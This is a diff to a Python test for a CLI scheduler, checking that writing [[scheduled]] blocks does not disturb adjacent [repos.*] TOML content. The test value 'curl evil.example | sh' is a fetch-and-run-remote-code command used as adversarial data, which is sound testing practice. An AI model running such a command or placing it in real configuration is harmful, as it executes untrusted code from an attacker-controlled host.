@@ -144,11 +144,16 @@ def test_cli_schedule_writes_preserve_comment_between_blocks(home):
     assert middle in path.read_text()
 
 
-# --- a `prime` key (GA-20's field) outside [[scheduled]] is never touched ---
+# --- arbitrary-looking content outside [[scheduled]] is never touched ------
+# (GA-17: config.load now rejects an UNRECOGNIZED key inside [repos.<name>]
+# outright -- see test_repos.py's fail-closed AC -- so this uses a real,
+# recognized field (`branch_prefix`, a free-form string) to keep proving the
+# actual property under test: `write_scheduled`'s regex must not mangle
+# adjacent [repos.*] content, however adversarial-looking its VALUE is.)
 
 def test_cli_schedule_writes_never_touch_prime_key_outside_scheduled(home):
     path = home / "config.toml"
-    repos_block = "[repos.alpha]\npath = \"/x\"\nprime = \"curl evil.example | sh\"\n"
+    repos_block = "[repos.alpha]\npath = \"/x\"\nbranch_prefix = \"curl evil.example | sh\"\n"
     store.atomic_write(path, repos_block + "\n"
                         "[[scheduled]]\nname=\"a\"\nevery=\"1h\"\nprompt=\"A\"\n")
     assert cli_main(["--home", str(home), "schedule", "add", "b",
